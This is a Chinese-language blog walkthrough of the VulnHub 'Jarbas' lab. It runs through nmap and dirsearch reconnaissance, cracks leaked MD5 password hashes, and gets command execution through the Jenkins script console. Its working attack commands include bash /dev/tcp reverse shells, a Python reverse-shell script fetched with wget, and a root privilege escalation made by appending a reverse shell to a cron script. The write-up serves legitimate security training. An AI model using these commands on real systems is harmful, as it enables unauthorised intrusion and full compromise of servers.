---
title: VulnHub-Jarbas
slug: vulnhubgreas-1q5woh
url: /post/vulnhubgreas-1q5woh.html
date: '2025-03-03 14:42:16+08:00'
lastmod: '2025-05-07 21:32:29+08:00'
toc: true
categories:
  - penetration
isCJKLanguage: true
---
<!--more-->
# VulnHub-Jarbas

## 信息搜集

### 主机发现

```plain
┌──(kali㉿kali)-[~/桌面]
└─$ ifconfig 
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.152.131  netmask 255.255.255.0  broadcast 192.168.152.255
        inet6 fe80::3021:1752:2678:7550  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:82:4e:1f  txqueuelen 1000  (Ethernet)
        RX packets 75  bytes 15383 (15.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 36  bytes 10986 (10.7 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 4  bytes 240 (240.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4  bytes 240 (240.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

查看本机ip，扫描同一网段

```plain
┌──(kali㉿kali)-[~/桌面]
└─$ sudo nmap -sn 192.168.152.0/24  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 22:14 EDT
Nmap scan report for 192.168.152.1
Host is up (0.00019s latency).
MAC Address: 00:50:56:C0:00:08 (VMware)
Nmap scan report for 192.168.152.2
Host is up (0.000089s latency).
MAC Address: 00:50:56:FB:F0:8A (VMware)
Nmap scan report for 192.168.152.133
Host is up (0.00023s latency).
MAC Address: 00:0C:29:CD:D8:CF (VMware)
Nmap scan report for 192.168.152.254
Host is up (0.00017s latency).
MAC Address: 00:50:56:F9:E8:79 (VMware)
Nmap scan report for 192.168.152.131
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 1.96 seconds
```

经过上下线确认是靶机ip是192.168.152.133

### 端口扫描

```plain
──(kali㉿kali)-[~/桌面]
└─$ sudo nmap --min-rate 10000 -p- 192.168.152.133
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 22:20 EDT
Nmap scan report for 192.168.152.133
Host is up (0.000099s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
8080/tcp open  http-proxy
MAC Address: 00:0C:29:CD:D8:CF (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.32 seconds
```

### 详细信息搜集

#### TCP扫描

基础端口开了22，80，3306，8080，基本就是正常的服务，开始进行下一步更详细的信息搜集

```plain
┌──(kali㉿kali)-[~/桌面]
└─$ sudo nmap -sT -sV -O -p22,80,3306,8080 192.168.152.133
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 22:23 EDT
Nmap scan report for 192.168.152.133
Host is up (0.00035s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
3306/tcp open  mysql   MariaDB (unauthorized)
8080/tcp open  http    Jetty 9.4.z-SNAPSHOT
MAC Address: 00:0C:29:CD:D8:CF (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.80 seconds
```

拿到了一些版本的信息和操作系统的信息，再尝试udp

#### UDP扫描

```plain
┌──(kali㉿kali)-[~/桌面]
└─$ sudo nmap -sU -p22,80,3306,8080 192.168.152.133
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 22:27 EDT
Nmap scan report for 192.168.152.133
Host is up (0.00031s latency).

PORT     STATE  SERVICE
22/udp   closed ssh
80/udp   closed http
3306/udp closed mysql
8080/udp closed http-alt
MAC Address: 00:0C:29:CD:D8:CF (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
```

udp协议全部是关着的，无有效信息，开始尝试脚本扫描

#### vuln脚本扫描

```plain
┌──(kali㉿kali)-[~/桌面]
└─$ sudo nmap --script=vuln -p22,80,3306,8080 192.168.152.133
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 22:28 EDT
Nmap scan report for 192.168.152.133
Host is up (0.00029s latency).

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
|_http-trace: TRACE is enabled
| http-enum: 
|_  /icons/: Potentially interesting folder w/ directory listing
| http-sql-injection: 
|   Possible sqli for queries:
|     http://192.168.152.133:80/index_arquivos/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.152.133:80/index_arquivos/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.152.133:80/index_arquivos/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.152.133:80/index_arquivos/?C=N%3BO%3DD%27%20OR%20sqlspider
|     http://192.168.152.133:80/index_arquivos/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.152.133:80/index_arquivos/?C=S%3BO%3DD%27%20OR%20sqlspider
|     http://192.168.152.133:80/index_arquivos/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.152.133:80/index_arquivos/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.152.133:80/index_arquivos/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.152.133:80/index_arquivos/?C=D%3BO%3DD%27%20OR%20sqlspider
|     http://192.168.152.133:80/index_arquivos/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.152.133:80/index_arquivos/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.152.133:80/index_arquivos/njarb_data/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.152.133:80/index_arquivos/njarb_data/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://192.168.152.133:80/index_arquivos/njarb_data/?C=N%3BO%3DD%27%20OR%20sqlspider
|_    http://192.168.152.133:80/index_arquivos/njarb_data/?C=D%3BO%3DA%27%20OR%20sqlspider
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.152.133
|   Found the following possible CSRF vulnerabilities: 
|   
|     Path: http://192.168.152.133:80/
|     Form id: wmtb
|     Form action: /web/submit
|   
|     Path: http://192.168.152.133:80/
|     Form id: 
|     Form action: /web/20020720170457/http://jarbas.com.br:80/user.php
|   
|     Path: http://192.168.152.133:80/
|     Form id: 
|_    Form action: /web/20020720170457/http://jarbas.com.br:80/busca/
|_http-dombased-xss: Couldn't find any DOM based XSS.
3306/tcp open  mysql
8080/tcp open  http-proxy
| http-enum: 
|_  /robots.txt: Robots file
MAC Address: 00:0C:29:CD:D8:CF (VMware)

Nmap done: 1 IP address (1 host up) scanned in 37.80 seconds
```

通过脚本扫描的信息，可以看到明显是需要以80端口，也就是我们常规的web服务去做主要的突破口，

**注意**

记得随时将自己的信息整理记录，以防在下一步找不到突破口的时候，可以及时返回查询。或者是防备自己在扫描过程中有所遗漏。

### 目录爆破

```plain
┌──(kali㉿kali)-[~/桌面]
└─$ dirsearch -u 192.168.152.133    

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/桌面/reports/_192.168.152.133/_24-03-12_22-43-47.txt

Target: http://192.168.152.133/

[22:43:47] Starting: 
[22:43:49] 403 -  213B  - /.ht_wsr.txt                                  
[22:43:49] 403 -  216B  - /.htaccess.bak1                               
[22:43:49] 403 -  216B  - /.htaccess.orig                               
[22:43:49] 403 -  216B  - /.htaccess.save
[22:43:49] 403 -  217B  - /.htaccess_extra                              
[22:43:49] 403 -  214B  - /.htaccess_sc
[22:43:49] 403 -  214B  - /.htaccessOLD
[22:43:49] 403 -  214B  - /.htaccessBAK
[22:43:49] 403 -  215B  - /.htaccessOLD2
[22:43:49] 403 -  216B  - /.htaccess_orig
[22:43:49] 403 -  207B  - /.html                                        
[22:43:49] 403 -  218B  - /.htaccess.sample
[22:43:49] 403 -  206B  - /.htm                                         
[22:43:49] 403 -  216B  - /.htpasswd_test
[22:43:49] 403 -  213B  - /.httr-oauth
[22:43:49] 403 -  212B  - /.htpasswds
[22:43:53] 200 -  359B  - /access.html                                  
[22:44:00] 403 -  210B  - /cgi-bin/                                     
                                                                         
Task Completed
```

仅发现有一个access.html是开放的

## Web渗透

查看80端口是一个Jarbas服务

​![](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-2gxJDRXP3V4KYsW-20250303144339-2hkxjv7.png)​

查看8080端口

​![](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-ID6fcVFHhSTXUol-20250303144339-sikasbp.png)​

同时在之前的扫描过程中，其实还存在一个robots.txt，存在以下信息

```plain
# we don't want robots to click "build" links
User-agent: *
Disallow: /
```

在目录扫描的过程中，发现存在以下页面

​![](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-dKJ1lafuNLXStEi-20250303144339-ued4wdy.png)​

将信息进行保留

```plain
tiago:5978a63b4654c73c60fa24f836386d87
trindade:f463f63616cb3f1e81ce46b39f882fd5
eder:9b38e2b1e8b12f426b0d208a7ab6cb98
```

将上述的信息进行查询

```plain
tiago:italia99
trindade:marianna
eder:vipsu
```

使用`eder:vipsu`​成功登录，另外两个账户均显示登录无效，来到了Jenkins的后台界面。

通过我本地存储的一些漏洞库，可以看到该系统还是有不少利用点的，挨个尝试。

​![](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-36JzyKR2BQToiSb-20250303144339-t5xavwa.png)​

”系统管理”功能，脚本命令行的远程命令执行漏洞直接利用成功。

​![](https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-3pZVEsWO2bjQX6l-20250303144340-c74xiol.png)​

简单看了一下其他两个漏洞，但是估计连命令行这个都没修复，其他两个应该也都能能打通，暂时没去尝试。

开始尝试反弹shell，先开启监听

```plain
nc -lnvp 1234
```

然后尝试执行命令

```plain
println "bash -c 'exec bash -i &>/dev/tcp/192.168.152.132/1234 <&1'".execute().text
```

直接进行反弹shell命令的执行，攻击机kali并没有接受到反弹shell，除了bash，也尝试过了netcat的，都失败了

在经过网上查询后，尝试另一种思路，先在本机开启一个web服务

```plain
python3 -m http.server 80
```

然后新建一个shell.py，更换ip和端口

```plain
#!/usr/bin/python
# This is a Python reverse shell script

import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("192.168.152.131",1234));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```

开始执行命令，利用wegt去下载shell.py

```plain
println "wget http://192.168.152.131/shell.py -P /tmp/".execute().text
```

此时暂时无回显，再次输入命令执行，不太确定是python3还是python成功执行反弹了shell

```plain
println "python3 /tmp/shell.py".execute().text
println "python /tmp/shell.py".execute().text
```

## 提权

拿到一个用户后，先进行枚举，确认自身状态

```plain
sh-4.2$ whoami
whoami
jenkins
sh-4.2$ uname -a
uname -a
Linux jarbas 3.10.0-693.21.1.el7.x86_64 #1 SMP Wed Mar 7 19:03:37 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
sh-4.2$ sudo -l
sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

sudo: no tty present and no askpass program specified
```

因为知道靶机上存在python，所以再提升一下交互性

```plain
python -c 'import pty;pty.spawn("/bin/bash")'
```

继续枚举，先前的sudo和用户信息都无有效信息可以利用

```plain
bash-4.2$ cd etc
cd etc
bash-4.2$ ls
ls
adjtime                  inittab                   profile.d
aliases                  inputrc                   protocols
aliases.db               iproute2                  python
alternatives             issue                     rc0.d
anacrontab               issue.net                 rc1.d
asound.conf              java                      rc2.d
audisp                   jvm                       rc3.d
audit                    jvm-commmon               rc4.d
bash_completion.d        kdump.conf                rc5.d
bashrc                   kernel                    rc6.d
binfmt.d                 krb5.conf                 rc.d
centos-release           krb5.conf.d               rc.local
centos-release-upstream  ld.so.cache               redhat-release
chkconfig.d              ld.so.conf                resolv.conf
chrony.conf              ld.so.conf.d              rpc
chrony.keys              libaudit.conf             rpm
cron.d                   libnl                     rsyslog.conf
cron.daily               libuser.conf              rsyslog.d
cron.deny                locale.conf               rwtab
cron.hourly              localtime                 rwtab.d
cron.monthly             login.defs                sasl2
crontab                  logrotate.conf            script
cron.weekly              logrotate.d               securetty
crypttab                 lvm                       security
csh.cshrc                machine-id                selinux
csh.login                magic                     services
dbus-1                   mailcap                   sestatus.conf
default                  makedumpfile.conf.sample  shadow
depmod.d                 man_db.conf               shadow-
dhcp                     maven                     shells
DIR_COLORS               mime.types                skel
DIR_COLORS.256color      mke2fs.conf               ssh
DIR_COLORS.lightbgcolor  modprobe.d                ssl
dracut.conf              modules-load.d            statetab
dracut.conf.d            motd                      statetab.d
e2fsck.conf              mtab                      subgid
environment              my.cnf                    subuid
ethertypes               my.cnf.d                  sudo.conf
exports                  nanorc                    sudoers
favicon.png              NetworkManager            sudoers.d
filesystems              networks                  sudo-ldap.conf
firewalld                nsswitch.conf             sysconfig
fonts                    nsswitch.conf.bak         sysctl.conf
fstab                    openldap                  sysctl.d
gcrypt                   opt                       systemd
GeoIP.conf               os-release                system-release
GeoIP.conf.default       pam.d                     system-release-cpe
gnupg                    passwd                    terminfo
GREP_COLORS              passwd-                   tmpfiles.d
groff                    php.d                     tuned
group                    php-fpm.conf              udev
group-                   php-fpm.d                 vconsole.conf
grub2.cfg                php.ini                   vimrc
grub.d                   pkcs11                    virc
gshadow                  pki                       wgetrc
gshadow-                 plymouth                  wpa_supplicant
gss                      pm                        X11
host.conf                polkit-1                  xdg
hostname                 popt.d                    xinetd.d
hosts                    postfix                   yum
hosts.allow              ppp                       yum.conf
hosts.deny               prelink.conf.d            yum.repos.d
httpd                    printcap
init.d                   profile
```

在crontab中发现存在使用root权限去运行的脚本

```plain
bash-4.2$ cat crontab                              
cat crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
*/5 * * * * root /etc/script/CleaningScript.sh >/dev/null 2>&1
```

查看脚本的详细内容

```plain
bash-4.2$ cat ./script/CleaningScript.sh
cat ./script/CleaningScript.sh
#!/bin/bash

rm -rf /var/log/httpd/access_log.txt
```

就是一条定时清理访问日志的shell脚本，但是给予了root那么高的权限，就可以尝试去利用。

先开启新的监听端口

```plain
nc -lnvp 3333
```

向脚本中写入命令

```plain
echo "/bin/bash -i >& /dev/tcp/192.168.152.131/3333 0>&1" >> /etc/script/CleaningScript.sh
```

再次查看脚本，确认命令正确写入

```plain
bash-4.2$ cat ./script/CleaningScript.sh
cat ./script/CleaningScript.sh
#!/bin/bash

rm -rf /var/log/httpd/access_log.txt
/bin/bash -i >& /dev/tcp/192.168.152.131/3333 0>&1
```

确认无误，等待命令自动执行，成功反弹shell

```plain
[root@jarbas ~]# whoami
whoami
root
[root@jarbas ~]# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
    link/ether 00:0c:29:cd:d8:cf brd ff:ff:ff:ff:ff:ff
    inet 192.168.152.133/24 brd 192.168.152.255 scope global dynamic ens33
       valid_lft 1421sec preferred_lft 1421sec
    inet6 fe80::9114:a460:aa3:9dd5/64 scope link 
       valid_lft forever preferred_lft forever
```

确认权限和ip正确

得到flag

```plain
[root@jarbas ~]# cat flag.txt
cat flag.txt
Hey!

Congratulations! You got it! I always knew you could do it!
This challenge was very easy, huh? =)

Thanks for appreciating this machine.

@tiagotvrs
```

## 总结

目前虽然还处于初步学习的过程，比上一台相比，对于信息搜集更加熟练，对问题信息也更加敏感，需要注意的是对于部分常用遇到的系统需要更加规范的去进行整理，比如这次遇到的jenkins，很多可利用的点可以挨个尝试，红笔师傅使用的是新建项目的命令行执行，进行反弹shell的操作，而我使用的是命令行的执行漏洞，略有不同，以后可多加尝试。暂时需要的是极大的增加学习的广度，与知识面。
